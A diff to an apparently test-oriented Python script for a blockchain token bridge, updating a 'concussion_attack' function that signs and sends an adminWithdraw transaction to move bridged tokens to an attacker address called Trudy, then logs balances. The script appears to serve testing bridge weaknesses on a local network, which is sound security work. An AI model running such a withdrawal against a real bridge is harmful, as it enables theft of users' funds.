@@ -274,24 +274,33 @@ def concussion_attack(mint: bool = False):
         abi = json.loads(f.read())['abi']
     contract = n0.provider.eth.contract(
         address=contracts['handler'].address, abi=abi)
+    ''' The new bridge implementation changed format for function params
     target = n0.provider.toBytes(
         hexstr=contracts['target'].address).rjust(32, b'\0')
     trudy = n0.provider.toBytes(hexstr=TRUDY_ADDR).rjust(32, b'\0')
     amount = n0.provider.toBytes(primitive=amount).rjust(32, b'\0')
     data = target + trudy + amount
+    tx = contract.functions.adminWithdraw(
+        contracts['handler'].address, data).buildTransaction(t_dict)'''
     # Fire transaction
     t_dict = {"chainId": n0.chain_id,
-              "nonce": n0.eth.get_transaction_count(acc.address, 'pending'),
+              "nonce": n0.provider.eth.get_transaction_count(acc.address, 'pending'),
               "gasPrice": n0.provider.toWei(10, "gwei"),
               "gas": 1000000}
-    tx = contract.functions.adminWithdraw(contracts['handler'].address, data).buildTransaction(t_dict)
+    tx = contract.functions.adminWithdraw(
+        contracts['handler'].address, contracts['target'].address, TRUDY_ADDR,
+        amount).buildTransaction(t_dict)
     signed_tx = n0.provider.eth.account.sign_transaction(tx, acc.key)
     tx_hash = n0.provider.eth.send_raw_transaction(
         signed_tx.rawTransaction)
-    logging.info("adminWithdraw calldata: " + eth_utils.hexadecimal.encode_hex(data)+"\ntx hash: " + tx_hash.hex())
-    tx_recipit = n0.provider.eth.wait_for_transaction_receipt(tx_hash)
-    logging.debug(tx_recipit)
-    
+    logging.info("adminWithdraw tx_hash: " + tx_hash.hex())
+    # Trudy balance after the adminWithdraw
+    cb.balance(n0.node_endpoint, ContractTypes.ERC20,
+               TRUDY_ADDR, contracts['target'].address)
+    # Tokens bridged balance after withdraw
+    cb.balance(n0.node_endpoint, ContractTypes.ERC20,
+               contracts['handler'].address, contracts['target'].address)
+
 
 def tests():
     logging.info("Starting tests.")
@@ -305,6 +314,7 @@ def tests():
     # TODO: Fakelock all'indietro non dovrebbe poter generare fondi perche` non sono stati sbloccati
     # malicious_rollback()
     concussion_attack()
+    logging.info("Finished tests.")
 
 
 if __name__ == "__main__":
